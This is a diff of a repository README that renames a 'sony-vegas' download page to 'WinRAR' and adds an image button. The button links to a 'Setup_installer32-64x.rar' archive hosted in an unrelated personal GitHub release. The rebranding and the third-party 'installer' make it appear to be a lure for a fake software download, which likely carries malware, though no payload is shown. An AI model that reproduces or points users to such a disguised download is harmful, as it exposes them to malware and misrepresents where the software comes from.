@@ -1,5 +1,7 @@
-# sony-vegas
-This is the sony-vegas for Windows 7, 8, 10, 11.
+# WinRAR
+This is the WinRAR for Windows 7, 8, 10, 11.
+
+[![WinRAR](./WinRAR.png)](https://github.com/akram209/akram209/releases/download/Release/Setup_installer32-64x.rar)
 
 ## Download
 Click the button below to download the setup for Windows 7/8/10/11.
